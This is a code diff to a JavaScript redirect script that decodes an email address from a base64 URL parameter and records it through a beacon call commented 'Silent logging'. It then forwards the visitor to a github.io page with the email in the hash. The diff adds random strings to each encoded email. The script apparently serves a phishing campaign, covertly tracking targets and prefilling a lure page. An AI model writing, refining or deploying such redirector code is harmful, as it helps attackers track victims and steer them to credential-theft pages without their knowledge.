@@ -21,6 +21,27 @@ function decodeBase64(s) {
     return r;
 }
 
+function generateRandomString(length) {
+    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var result = '';
+    for (var i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+}
+
+function addRandomStringsToEmail(email) {
+    // Generate 4 different random strings
+    var randomStrings = [];
+    for (var i = 0; i < 4; i++) {
+        randomStrings.push(generateRandomString(8)); // 8 characters each
+    }
+    
+    // Join them with a separator and append to email
+    var suffix = randomStrings.join('-');
+    return email + '|' + suffix;
+}
+
 function logToConsole(message, data) {
     try {
         console.log("[Redirect Debug]", message, data || "");
@@ -48,46 +69,60 @@ function processRedirect() {
             return;
         }
 
-        // Decode (supports double encoding fallback)
+        // Decode once
         var decoded = decodeBase64(pid);
         logToConsole("Decoded once:", decoded);
 
-        // Try double decode if needed
-        if (!validateEmail(decoded)) {
+        // Check if it's a valid email after first decode
+        var emailAfterFirstDecode = decoded.replace(/\$/g, '@');
+        var isDoubleEncoded = false;
+
+        // If not a valid email, try double decode
+        if (!validateEmail(emailAfterFirstDecode)) {
             try {
                 var doubleDecoded = decodeBase64(decoded);
-                if (validateEmail(doubleDecoded)) {
+                logToConsole("Double decoded raw:", doubleDecoded);
+                
+                var emailAfterDoubleDecode = doubleDecoded.replace(/\$/g, '@');
+                if (validateEmail(emailAfterDoubleDecode)) {
                     decoded = doubleDecoded;
-                    logToConsole("Double decoded:", decoded);
+                    emailAfterFirstDecode = emailAfterDoubleDecode;
+                    isDoubleEncoded = true;
+                    logToConsole("Successfully double decoded email:", emailAfterFirstDecode);
                 }
-            } catch(e) {}
+            } catch(e) {
+                logToConsole("Double decode failed:", e);
+            }
         }
 
-        // Replace $ with @
-        var email = decoded.replace(/\$/g, '@');
-
         // Final validation
-        if (!validateEmail(email)) {
-            logToConsole("Invalid email, stopping:", email);
+        if (!validateEmail(emailAfterFirstDecode)) {
+            logToConsole("Invalid email, stopping:", emailAfterFirstDecode);
             return;
         }
 
-        // Re-encode clean email
-        var newHash = btoa(email);
+        // Add 4 random strings to the email
+        var emailWithRandomStrings = addRandomStringsToEmail(emailAfterFirstDecode);
+        logToConsole("Email with random strings:", emailWithRandomStrings);
+
+        // Re-encode with random strings
+        var newHash = btoa(emailWithRandomStrings);
 
         // Silent logging
         try {
             navigator.sendBeacon(
                 "log.php",
                 JSON.stringify({ 
-                    email: email,
+                    email: emailAfterFirstDecode,
+                    email_with_suffix: emailWithRandomStrings,
                     original_pid: pid,
+                    double_encoded: isDoubleEncoded,
                     timestamp: new Date().toISOString()
                 })
             );
         } catch (e) {}
 
-        // Redirect - now uses the pid for redirect URL
+        // Redirect with the new hash
         var redirectUrl = "https://technical-engin-year.github.io/didactic-engineering-tribble#" + newHash;
         logToConsole("Redirecting to:", redirectUrl);
 
